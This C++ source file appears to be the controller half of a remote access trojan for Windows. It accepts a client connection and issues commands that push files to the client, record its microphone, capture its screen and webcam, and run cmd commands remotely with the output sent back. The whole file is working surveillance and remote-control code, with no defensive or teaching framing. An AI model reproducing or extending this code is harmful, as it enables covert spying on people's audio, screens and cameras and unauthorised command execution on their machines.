/*
	Command:	Download <file>: Receive a file from server
				Mic <seconds>: Record microphone for <seconds> and send to server
				Screenshoot: Take a client screenshoot and send to server
				Camera: Take a client webcam snapshot and send to server
				Remote <command>: Execute command in cmd and send output to server
*/

#include "Header.h"

#define FILE_TYPE_RECORDING 0
#define FILE_TYPE_SCREENSHOT 1
#define FILE_TYPE_CAMERA 2


int main(int argc, char* argv[]) {
	WSADATA wsaData;
	SOCKET clientSocket = INVALID_SOCKET;
	SOCKET listenSocket = INVALID_SOCKET;
	addrinfo* result = NULL;
	addrinfo hints;

	int iResult;
	string input, command, option;

	iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (iResult != 0) {
		printf("[ERROR] WSAStartup. %d\n", WSAGetLastError());
		return 1;
	}

	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_INET;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;
	hints.ai_flags = AI_PASSIVE;

	iResult = GetAddrInfo(NULL, PORT, &hints, &result);
	if (iResult != 0) {
		printf("[ERROR] GetAddrInfo. %d\n", WSAGetLastError());
		WSACleanup();
		return 2;
	}

	listenSocket = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
	if (listenSocket == INVALID_SOCKET) {
		printf("[ERROR] create socket. %d\n", WSAGetLastError());
		freeaddrinfo(result);
		WSACleanup();
		return 3;
	}

	iResult = bind(listenSocket, result->ai_addr, result->ai_addrlen);
	if (iResult == SOCKET_ERROR) {
		printf("[ERROR] bind. %d\n", WSAGetLastError());
		freeaddrinfo(result);
		closesocket(listenSocket);
		WSACleanup();
		return 4;
	}

	freeaddrinfo(result);

	iResult = listen(listenSocket, SOMAXCONN);
	if (iResult == SOCKET_ERROR) {
		printf("[ERROR] listen. %d\n", WSAGetLastError());
		closesocket(listenSocket);
		WSACleanup();
		return 5;
	}

	clientSocket = accept(listenSocket, NULL, NULL);
	if (clientSocket == INVALID_SOCKET) {
		printf("[ERROR] accept. %d\n", WSAGetLastError());
		closesocket(listenSocket);
		WSACleanup();
		return 6;
	}

	printf("[NOTICE] Client connected with port %s\n", PORT);
	closesocket(listenSocket);



	do {
		input = "";
		command = "";
		option = "";

		printf("[INPUT] Enter command: ");
		getline(cin, input);

		// get command
		BOOL isOption = FALSE;
		for (int i = 0; i < input.size(); i++) {
			if (isOption) {
				option.push_back(input[i]);
			}
			else {
				if (input[i] == ' ' || input[i] == '\0') {
					isOption = TRUE;
					continue;
				}
				command.push_back(input[i]);
			}
		}

		if (command.empty())continue;

		//send command size first
		DWORD inputSize = input.size();

		iResult = send(clientSocket, (char*)&inputSize, sizeof(inputSize), 0);
		if (iResult < 0) {
			printf("[ERROR] send. %d\n", WSAGetLastError());
			closesocket(clientSocket);
			WSACleanup();
			return 7;
		}

		// send command
		iResult = send(clientSocket, input.c_str(), input.size(), 0);

		if (iResult > 0) {
			printf("[OK] Command sent.\n");
		}
		else if (iResult < 0) {
			printf("[ERROR] send. %d\n", WSAGetLastError());
			closesocket(clientSocket);
			WSACleanup();
			return 8;
		}


		if (command.compare("Quit") == 0) {
			break;
		}

		//Download Function - Send file to client.
		if (command.compare("Download") == 0) {
			sendFile(option.c_str(), clientSocket);
		}

		//Receive client's micro recording.
		if (command.compare("Mic") == 0) {
			receiveFile(FILE_TYPE_RECORDING, clientSocket);
		}

		//Receive client's screenshot.
		if (command.compare("Screenshot") == 0) {
			receiveFile(FILE_TYPE_SCREENSHOT, clientSocket);
		}

		//Receive client's camera picture.
		if (command.compare("Camera") == 0) {
			receiveFile(FILE_TYPE_CAMERA, clientSocket);
		}

		if (command.compare("Remote") == 0) {
			DWORD bufferSize = 0;
			char* recvBuffer = NULL;
			while (1) {
				//Receive command output size
				iResult = recv(clientSocket, (char*)&bufferSize, sizeof(bufferSize), 0);
				if (iResult < 0) {
					printf("[ERROR] recv command output size. %d\n", WSAGetLastError());
					break;
				}

				// check output
				if (bufferSize == 0) {
					break;
				}
				else {
					//Receive command output.
					recvBuffer = (char*)calloc(bufferSize + 1, sizeof(char));
					if (recvBuffer) {
						iResult = recv(clientSocket, recvBuffer, bufferSize, 0);
						if (iResult < 0) {
							printf("[ERROR] recv command output. %d\n", WSAGetLastError());
							free(recvBuffer);
							break;
						}
						printf(recvBuffer);
						free(recvBuffer);
					}
				}
			}
		}


	} while (1);

	printf("[NOTICE] Shutting down.\n");
	iResult = shutdown(clientSocket, SD_SEND);
	if (iResult == SOCKET_ERROR) {
		printf("[ERROR] shutdown. %d\n", WSAGetLastError());
		closesocket(clientSocket);
		WSACleanup();
		return 9;
	}

	// cleanup
	closesocket(clientSocket);
	WSACleanup();

	return 0;
}

void sendFile(const char* fileName, SOCKET clientSocket) {
	DWORD fileSize = 0;
	HANDLE file = NULL;
	BOOL isExist = FALSE;
	int iResult = 0;

	file = CreateFile(fileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (file == INVALID_HANDLE_VALUE) {
		printf("[ERROR] open file. %d\n", GetLastError());
	}
	else isExist = TRUE;

	//send file exist signal

	if (isExist && sendSignal(isExist, clientSocket)) {
		// send file size
		fileSize = GetFileSize(file, NULL);
		iResult = send(clientSocket, (char*)&fileSize, sizeof(fileSize), 0);
		if (iResult != sizeof(fileSize)) {
			printf("[ERROR] send file size. %d\n", WSAGetLastError());
			return;
		}

		DWORD dwByteRead = 0;
		char* buffer = NULL;
		// send file content
		do {
			buffer = (char*)calloc(BUFSIZ, sizeof(char));
			if (buffer) {
				if (ReadFile(file, buffer, BUFSIZ, &dwByteRead, NULL) == FALSE) {
					printf("[ERROR] read file. %d\n", GetLastError());
					free(buffer);
					return;
				}
				iResult = send(clientSocket, buffer, dwByteRead, 0);
				if (iResult != dwByteRead) {
					printf("[ERROR] send file data. %d\n", WSAGetLastError());
					free(buffer);
					return;
				}
				free(buffer);
			}
		} while (dwByteRead > 0);
		CloseHandle(file);
	}
}
// receive file from client and save
void receiveFile(int fileType, SOCKET clientSocket) {
	char* buffer = NULL, *filePath = NULL;
	HANDLE file = NULL;
	int iResult = 0;
	DWORD dwByteWritten = 0;
	DWORD fileSize = 0;
	BOOL isExist = FALSE;

	// get file exist signal from client
	isExist = receiveSignal(clientSocket);

	if (isExist) {
		time_t t = time(0);
		char* now = ctime(&t);
		now[strlen(now) - 1] = '\0';

		string fileName = "";


		if (fileType == FILE_TYPE_RECORDING) {
			fileName += "Recording ";
			fileName += now;
			fileName += ".wav";
		}
		if (fileType == FILE_TYPE_SCREENSHOT) {
			fileName += "Screenshot ";
			fileName += now;
			fileName += ".bmp";
		}
		if (fileType == FILE_TYPE_CAMERA) {
			fileName += "Camera ";
			fileName += now;
			fileName += ".bmp";
		}

		fileName = regex_replace(fileName, regex(":"), "-");

		file = CreateFile(fileName.c_str(), GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
		if (file == INVALID_HANDLE_VALUE) {
			printf("[ERROR] create file %d\n", GetLastError());
			return;
		}

		// receive file size
		iResult = recv(clientSocket, (char*)&fileSize, sizeof(fileSize), 0);
		if (iResult != sizeof(fileSize)) {
			printf("[ERROR] recv file size. %d\n", WSAGetLastError());
			CloseHandle(file);
			return;
		}

		// receive file data and write
		DWORD tempFileSize = fileSize;
		do {
			buffer = (char*)calloc(BUFSIZ, sizeof(char));
			if (buffer) {
				iResult = recv(clientSocket, buffer, BUFSIZ, 0);
				if (iResult <= 0) {
					printf("[ERROR] recv file data. %d\n", WSAGetLastError());
					CloseHandle(file);
					free(buffer);
					return;
				}

				if (WriteFile(file, buffer, iResult, &dwByteWritten, NULL) == FALSE) {
					printf("[ERROR] write file. %d\n", GetLastError());
					CloseHandle(file);
					free(buffer);
					return;
				}

				tempFileSize -= iResult;
				free(buffer);
			}
		} while (tempFileSize > 0);

		if (file != INVALID_HANDLE_VALUE) {
			filePath = (char*)calloc(MAX_PATH + 1, sizeof(char));
			if (filePath) {
				GetFinalPathNameByHandle(file, filePath, MAX_PATH, FILE_NAME_NORMALIZED);
				printf("File saved at %s\n", filePath);
				free(filePath);
			}
			CloseHandle(file);
		}

	}

}